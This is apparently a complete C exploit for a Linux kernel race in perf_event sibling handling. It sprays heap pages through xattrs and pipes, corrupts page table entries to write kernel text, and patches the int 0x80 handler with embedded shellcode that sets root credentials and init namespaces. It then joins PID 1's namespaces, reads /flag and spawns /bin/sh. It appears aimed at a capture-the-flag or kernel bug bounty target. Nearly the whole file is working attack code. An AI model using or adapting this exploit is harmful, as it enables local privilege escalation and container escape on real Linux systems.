#define _GNU_SOURCE   
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/xattr.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <stdio.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <keyutils.h>
#include <pthread.h>
#include <stdatomic.h>
#include <time.h>

#define TIMER 71000
#define SIBLINGS_MAX 1024 // about 0x4000 ~
#define CPU_A 1 // main cpu
#define CPU_B 0
#define MAX_TRY 4096
char shellcode[] = "\x0f\x01\xf8\x65\x4c\x8b\x24\x25\xc0\x0c\x02\x00\x4d\x8b\xb4\x24\x48\x02\x00\x00\x49\x81\xee\x30\xc0\x1e\x00\x4d\x89\xf0\x48\xc7\xc7\x01\x00\x00\x00\x4c\x89\xc0\x48\x05\x50\xde\x1b\x00\x41\x54\x41\x50\xff\xd0\x48\x89\xc3\x41\x58\x41\x5c\x4c\x89\xc0\x48\x05\x00\x69\xa7\x02\x48\x89\xc7\x48\x89\xbb\x38\x08\x00\x00\x49\x89\xbc\x24\x38\x08\x00\x00\x4c\x89\xc0\x48\x05\x40\x6b\xa7\x02\x48\x89\xc7\x49\x89\xbc\x24\xd8\x07\x00\x00\x0f\x01\xf8\x48\xcf";
// change nsproxy to initnsproxy & cred to init cred

inline static int _pin_to_cpu(int id)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(id, &set);
    return sched_setaffinity(getpid(), sizeof(set), &set);
}

void busy_wait(long us) {
    struct timespec start, current;
    
    clock_gettime(CLOCK_MONOTONIC, &start);

    do {
        clock_gettime(CLOCK_MONOTONIC, &current);
    } while ((current.tv_sec - start.tv_sec) * 1000000 + (current.tv_nsec - start.tv_nsec) / 1000 < us);
}

int timefds[0x500000];
int epfds[0x500000];
char buf[0x1000];
int tfd;

static void epoll_ctl_add(int epfd, int fd, uint32_t events)
{
	struct epoll_event ev;
	ev.events = events;
	ev.data.fd = fd;
	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
}

void do_epoll_enqueue(int fd)
{
	int cfd[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < 0x10; k++)
	{
		if (fork() == 0)
		{
			for (int i = 0; i < 0x300; i++)
			{
				timefds[i] = dup(fd);
			}
			for (int i = 0; i < 0x2c0; i++)
			{
				epfds[i] = epoll_create(0x1);
			}
			for (int i = 0; i < 0x2c0; i++)
			{
				for (int j = 0; j < 0x300; j++)
				{
					// queue as many as possible async waiters at timerfd waitqueue
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], buf, 1);
			raise(SIGSTOP); // stop here for nothing and just keep epoll alive
		}
		// sync to make sure it has queue what we need
		read(cfd[0], buf, 1);
	}
	close(cfd[0]);
	close(cfd[1]);
}

void paused(){
    write(1, "paused\n", 7);
    char buf[1];
    read(0, buf, 1);
}

void remove_xattr(char * name, int idx){
    char fname[0x20];
    sprintf(fname, "/tmp/x%d", idx);
    if (setxattr(fname, name, NULL, 0, 0) < 0){
        perror("remove_xattr()");
        exit(0);
    }
}

#define PREFIX "security."

static long perf_event_open(struct perf_event_attr *hw_event, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(SYS_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

#define MAP_SIZE (512ULL * 512ULL * 0x1000ULL)
#define ALIGN_2MB (512ULL * 0x1000ULL)
char * spray_addr[2];
int vuln_pipe[2];
void bootstrap() {
    char * addr;
    char buf[0x100] = {0xcc, };
    uint64_t current_brk = (uint64_t)sbrk(0);
    uint64_t aligned_addr = (current_brk / ALIGN_2MB) * ALIGN_2MB;
    addr = mmap((void *)(aligned_addr + ALIGN_2MB), MAP_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    for (size_t i = 0; i < MAP_SIZE; i += 0x1000 * 512)
        addr[i] = 0x41;
    for (size_t i = 0; i < MAP_SIZE; i += 0x1000)
        addr[i] = 0x41;
    spray_addr[0] = addr;
    if (pipe(vuln_pipe) < 0) {
        perror("pipe");
        return;
    }

    write(vuln_pipe[1], buf, sizeof(buf));
    addr = mmap((void *)aligned_addr + ALIGN_2MB + MAP_SIZE, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    for (size_t i = 0; i < MAP_SIZE; i += 0x1000 * 512)
        addr[i] = 0x41;
    for (size_t i = 0; i < MAP_SIZE; i += 0x1000)
        addr[i] = 0x41;
    spray_addr[1] = addr;

}

void set_max_fd_limit() {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == -1) {
        perror("getrlimit failed");
        exit(EXIT_FAILURE);
    }
    rl.rlim_cur = rl.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &rl) == -1) {
        perror("setrlimit failed");
        exit(EXIT_FAILURE);
    }
    printf("[+] changed fd limit: %ld\n", rl.rlim_cur);
}

#define MAX_FORK_CNT 50
int siblings_fork_pid[MAX_FORK_CNT]; 
int siblings_fork_cnt;
int siblings[SIBLINGS_MAX];
int siblings_cnt;
static atomic_int race_go = 0; // child process will use it
static atomic_int race_tf = 0; 

void print_buddyinfo(void) {
    int cnt=0;
    char buf[1024];
    int fd = open("/proc/buddyinfo", O_RDONLY);
    int n = read(fd, buf, sizeof(buf)-1);
    if(n > 0) {
        for (int i=0; i<n; i++){
            if (cnt == 2){
                buf[n] = 0;
                write(1, &buf[i], n-i);
                break;
            }
            if (buf[i] == 0xa)
                cnt++;
        }
    }
    close(fd);
}

struct xattr_return {
    uint64_t size;
    char *value;
};

struct xattr_return *read_xattr(char *fname, char *name){
    struct xattr_return *ret = (struct xattr_return *)calloc(sizeof(struct xattr_return), 1);
    ret->value = (char *)calloc(0x10000, 1);
    if((ret->size = getxattr(fname, name, ret->value, 0x10000)) < 0)
        puts("getxattr error");
    for (int i=0; i<0x10000; i+=0x1000) 
        ret->value[i] = 0x41;
    free(ret->value);
    return ret;
}

void spray_xattr_page(int size, int cnt, int idx){
    char value[0x4000] = {0, };
    char fname[0x20];
    sprintf(fname, "/tmp/x%d", idx);
    close(open(fname, O_CREAT | O_RDWR, 0777));
    for(int i = 0; i <= cnt; i++){
        char z[0x24] = {0, };
        sprintf(z,"x%d_%d", size, i);
        char *name = (char *)calloc(strlen(PREFIX) + strlen(z) + 1, 1);
        memset(value, i%0x100, size);
        strcpy(name, PREFIX);
        strcat(name, z);
        int ret = setxattr(fname, name, value, size, 0);
        if (ret < 0){
            perror("setxattr");
            exit(EXIT_FAILURE);
        }
    }
}

void resize_pipe(int fd, uint64_t sz){
    if(fcntl(fd, F_SETPIPE_SZ, sz) < 0)
        perror("pipe resize");
}

void race_gogo(int signo) { // signal handler
    atomic_store(&race_go, 1);
}

void race_notify(int signo) {
    atomic_store(&race_tf, 1);
}

void race_oracle(){
    struct sigaction sa;
    sa.sa_handler = race_notify;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGUSR1, &sa, NULL) < 0) {
        perror("sigaction");
        exit(EXIT_FAILURE);
    }
}

void print_proc_self_maps_raw() {
    int fd = open("/proc/self/maps", O_RDONLY);
    if (fd < 0) {
        write(STDERR_FILENO, "Error: Unable to open /proc/self/maps\n", 38);
        _exit(EXIT_FAILURE);
    }

    char buffer[256];
    ssize_t bytes_read;

    while ((bytes_read = read(fd, buffer, sizeof(buffer))) > 0) {
        write(STDOUT_FILENO, buffer, bytes_read);
    }

    if (bytes_read < 0) {
        write(STDERR_FILENO, "Error: Unable to read /proc/self/maps\n", 38);
        _exit(EXIT_FAILURE);
    }

    close(fd);
}

int race_id;
void race(int group_leader) { // caller must have ownership of the group
    int pipefd[2];
    uint64_t buf[0x4000] = {0, };
    char buffer[0x100] = {0x41, };
    if (pipe(pipefd) < 0){
        perror("race - pipe");
        exit(EXIT_FAILURE);
    }
    int ppid = getppid();
    int status;
    key_t keyid;
    if (race_id == 1) {
        spray_xattr_page(0x3008, 12, 1); // 12296
        spray_xattr_page(0x4008, 2, 1); // 16392
        remove_xattr("security.x16392_0", 1);
        remove_xattr("security.x16392_1", 1);
        remove_xattr("security.x12296_5", 1);
        remove_xattr("security.x12296_6", 1);
        remove_xattr("security.x12296_11", 1);
        resize_pipe(vuln_pipe[1], 0x1000 * 220);
        remove_xattr("security.x12296_10", 1);
        remove_xattr("security.x12296_7", 1); 
        if (setxattr("/tmp/x1", "security.x12296_10", buf, 0x3008, 0) < 0) {
            perror("reclaim failed");
            exit(EXIT_FAILURE);
        }
    }
    if (setxattr("/tmp/x1", "security.ssiphim", buf, 0x3008, 0) < 0) {
        perror("reclaim failed");
        exit(EXIT_FAILURE);
    }   
    pid_t child_pid = fork();
    if (child_pid == 0) {  // child read
        for (int i=0; i<512+511; i++){
            ioctl(siblings[i], PERF_EVENT_IOC_RESET, 0);
            ioctl(siblings[i], PERF_EVENT_IOC_ENABLE, 0);
        }

        close(siblings[100]); // index > 4 (other processes have 4 siblings)
        ioctl(group_leader, PERF_EVENT_IOC_RESET, 0);

        char *addr = (char *)mmap(NULL, 0x1000 * 0x80, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        for (int i=0; i<0x80; i++){
            ioctl(group_leader, PERF_EVENT_IOC_ENABLE, 0);
            addr[0x1000 * i] = 0x41;
            ioctl(group_leader, PERF_EVENT_IOC_DISABLE, 0);
        }
        write(pipefd[1], buffer, 1); // sync point A

        remove_xattr("security.x12296_10", 1);
        for (int _=0; _<32; _++) {
            read(group_leader, buf, sizeof(buf));
        }
        remove_xattr("security.ssiphim", 1);
        if (setxattr("/tmp/x1", "security.x12296_10", buf, 0x3008, 0) < 0) {
            perror("reclaim failed");
            exit(EXIT_FAILURE);
        }
        uint64_t pte = 0x8000000000000067;
        write(vuln_pipe[1], &pte, 8);  
        read(vuln_pipe[0], &pte, 8);
        munmap(addr, 0x1000 * 0x80);
        exit(0);
    }
    else if (child_pid > 0) {
        _pin_to_cpu(CPU_B);
        sched_yield(); 
        read(pipefd[0], buffer, 1); // sync point A
        struct itimerspec new = {.it_value.tv_nsec = TIMER}; // 95674
        timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
        close(siblings[100]); // 0x10 oob
    } else {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }
    waitpid(child_pid, &status, 0);
    kill(ppid, SIGUSR1);
    close(pipefd[0]);
    close(pipefd[1]);
    atomic_store(&race_go, 0); // \(*_*)/
}

pid_t add_siblings_fork(int group_leader, int cnt, int ctx_pid){
    if (siblings_fork_cnt >= MAX_FORK_CNT){
        puts("[-] nope");
        exit(EXIT_FAILURE);
    }
    _pin_to_cpu(CPU_A);
    sched_yield();
    char buffer[1] = {0};
    int pipe_fd[2];
    if (pipe(pipe_fd)<0){
        perror("add_siblings_fork - pipe");
        exit(EXIT_FAILURE);
    }

    pid_t child_pid = fork();
    if(child_pid < 0) {
        perror("add_siblings_fork - fork");
        exit(EXIT_FAILURE);
    }
    else if(child_pid == 0) { // child & parent must be on the same cpu (validation) 
        // both are pinned to cpu1
        // ctx switch parent -> child
        struct perf_event_attr pe;
        memset(&pe, 0, sizeof(pe));
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_PAGE_FAULTS;
        pe.disabled = 0;
        pe.exclude_kernel = 1;
        pe.exclude_hv = 1;
        pe.inherit = 1; // parent.attr.inherit == child.attr.inherit
        pe.pinned = 0; // child can not be pinned - group leader only
        for(int i=0; i<cnt; i++){
            int event;
            if (ctx_pid)
                event = perf_event_open(&pe, ctx_pid, 1, group_leader, 0);
            else
                event = perf_event_open(&pe, 0, 1, group_leader, 0);
            if (event == -1) {
                *buffer = 0x42; // nop
                if (write(pipe_fd[1], buffer, 1) < 0){
                    perror("add_siblings_fork - write");
                    exit(EXIT_FAILURE);
                }
                exit(EXIT_FAILURE);
            }
            else {
                siblings[i + siblings_cnt] = event;
                ioctl(event, PERF_EVENT_IOC_ENABLE, 0);
            }
        }
        siblings_cnt += cnt;
        if (ctx_pid == 0) {
            struct sigaction sa;
            sa.sa_handler = race_gogo;
            sigemptyset(&sa.sa_mask);
            sa.sa_flags = 0;
            if (sigaction(SIGUSR1, &sa, NULL) < 0) {
                perror("sigaction");
                exit(EXIT_FAILURE);
            }
        }
        *buffer = 0x41; // okay
        if (write(pipe_fd[1], buffer, 1) < 0){
            perror("add_siblings_fork - write");
            exit(EXIT_FAILURE);
        }
        if (ctx_pid == 0) {
            while (!atomic_load(&race_go)) {
                sched_yield();
            }
            race(group_leader);
        }
        sleep(9999999);
        exit(0);
    }
    if (read(pipe_fd[0], buffer, 1) < 0){
        perror("add_siblings_fork - read");
        exit(EXIT_FAILURE);
    }
    if (*buffer != 0x41) 
        return 0;

    if (kill(child_pid, SIGSTOP) < 0){
        perror("kill SIGSTOP");
        exit(EXIT_FAILURE);
    }
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    siblings_fork_pid[siblings_fork_cnt++] = child_pid;
    return child_pid;
}

void remove_all_siblings() { // parent process only
    int status;
    for (int i=0; i<siblings_fork_cnt; i++){
        kill(siblings_fork_pid[i], SIGCONT);
        kill(siblings_fork_pid[i], SIGKILL);
        waitpid(siblings_fork_pid[i], &status, 0);
        siblings_fork_pid[i] = 0;
    }

    for (int i=0; i<siblings_cnt; i++){
        if (close(siblings[i]) < 0) {
            perror("remove_all_siblings - close");
            exit(EXIT_FAILURE);
        }
    }
    siblings_cnt = 0;
    siblings_fork_cnt = 0; 
}

#define TLB_MMAP_SZ 0x1000 * 512 * 2
void shell(){
    __asm__ __volatile__(
        ".intel_syntax noprefix;"
        "int 0x80;"
        ".att_syntax;"
    );        
    int mntns_fd = open("/proc/1/ns/mnt", O_RDONLY);
    int netns_fd = open("/proc/1/ns/net", O_RDONLY);
    int pidns_fd = open("/proc/1/ns/pid", O_RDONLY);
    if (mntns_fd == -1)
        perror("[-] open(/proc/1/ns/mnt)");
    if (setns(mntns_fd, CLONE_NEWNS) == -1)
        perror("[-] setns mnt");

    if (netns_fd == -1)
        perror("[-] open(/proc/1/ns/net)");
    if (setns(netns_fd, CLONE_NEWNET) == -1)
        perror("[-] setns net");

    if (pidns_fd == -1)
        perror("[-] open(/proc/1/ns/pid)");
    if (setns(pidns_fd, CLONE_NEWPID) == -1)
        perror("[-] setns pid");

    char buf[0x200];
    memset(buf, 0, 0x200);
    int fd = open("/flag", O_RDONLY);
    read(fd, buf, 0x200);
    write(1, buf, 0x200);
    system("/bin/sh");
}

void lpe_gogosing(int ii, int jj) {
    _pin_to_cpu(CPU_A);
    sched_yield();
    uint64_t pte;
    printf("data%d : %lx %lx\n", -1, *(uint64_t *)(&spray_addr[ii][jj]), *(uint64_t *)(&spray_addr[ii][jj+0x9b0]));
retry:
    for (uint64_t i=0; i<0x10000; i++) {
        pte = 0x1000000 * i + 0x1401000;
        pte |= 0x8000000000000067;
        printf("[+] searching %lx\n", pte);
        write(vuln_pipe[1], &pte, 8);  
        read(vuln_pipe[0], &pte, 8);

        for (int j=0; j<16; j++) {
            mprotect(&spray_addr[ii][jj], 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE);
            if (j%8 == 0)
                printf("data%d : %lx %lx\n", j, *(uint64_t *)(&spray_addr[ii][jj]), *(uint64_t *)(&spray_addr[ii][jj+0x9b0]));
            
            if (*(uint64_t *)(&spray_addr[ii][jj+0x9b0]) == 0xc089f8010fca010fULL) 
            {
                for (int x=0; x<sizeof(shellcode); x++)
                    spray_addr[ii][jj+0x9b0 + x] = shellcode[x];
                goto found;
            }
            mprotect(&spray_addr[ii][jj], 0x1000, PROT_READ);
            busy_wait(10000);
            
        }
        mprotect(&spray_addr[ii][jj], 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC); // kernel text requires prot exec
    }
    goto retry;
found:
    puts("[+] int80 entry patched");
}

void exploit(){
    _pin_to_cpu(CPU_A); // main core
    sched_yield();
    for (int _=0; _<MAX_TRY; _++) {
    r3try:
        race_id++;
        pid_t pid = fork();
        if (pid == 0) {
            int ret = 0;
            int group_leader;
            struct perf_event_attr pe;
            memset(&pe, 0, sizeof(pe));
            pe.type = PERF_TYPE_SOFTWARE;
            pe.size = sizeof(pe);
            pe.config = PERF_COUNT_SW_PAGE_FAULTS;
            pe.disabled = 1;
            pe.exclude_kernel = 1;
            pe.exclude_hv = 1;
            pe.inherit = 1;
            pe.inherit_stat = 1;
            pe.pinned = 1;
            int pipefd[2];
            char buffer[1] = {1};
            if (pipe(pipefd) == -1) {
                perror("pipe");
                exit(EXIT_FAILURE);
            }
            
            pe.read_format = PERF_FORMAT_LOST | PERF_FORMAT_GROUP | PERF_FORMAT_TOTAL_TIME_RUNNING;
            group_leader = perf_event_open(&pe, 0, 1, -1, 0); 
            if (group_leader < 0){
                perror("Group leader open failed");
                exit(EXIT_FAILURE);
            }

            pid = add_siblings_fork(group_leader, 512, 0); // take off the ownership - context switch to child
            if (pid == 0) {
                ret = 1;
                goto gg;
            }

            pid = add_siblings_fork(group_leader, 511, pid); // first child has the ownership
            if (pid == 0) { // context switching failure?
                ret = 1;
                goto gg;
            }

            kill(siblings_fork_pid[0], SIGUSR1); // trigger race()
            atomic_store(&race_tf, 0);
            kill(siblings_fork_pid[0], SIGCONT); 
            while (atomic_load(&race_tf) == 0);
        gg:
            close(group_leader);
            remove_all_siblings(); 
            exit(ret);
        }
        else if(pid > 0) {
            int status;
            waitpid(pid, &status, 0);
            if (status == 256)
                goto r3try;
        }
        else {
            perror("fork nono !!@#W!KL@J!KLjaddklsJDl");
            exit(EXIT_FAILURE);
        }
    
        for (int i=0; i<2; i++) {
            for (int j=0; j<MAP_SIZE; j+=0x1000) {
                if (spray_addr[i][j] != 0x41) { // S
                    puts("[+] Race Successful");
                    lpe_gogosing(i, j);
                    return;
                }
            }
        }
        puts("[-] Race Failure");
    }
}

int main(void) {
    bootstrap(); 
    set_max_fd_limit();

    tfd = timerfd_create(CLOCK_MONOTONIC, 0);
	do_epoll_enqueue(tfd);

    race_oracle();
    spray_xattr_page(0x3000, 2048, 0);
    exploit();
    shell();
    sleep(999999); // munmap will trigger kernel panic
}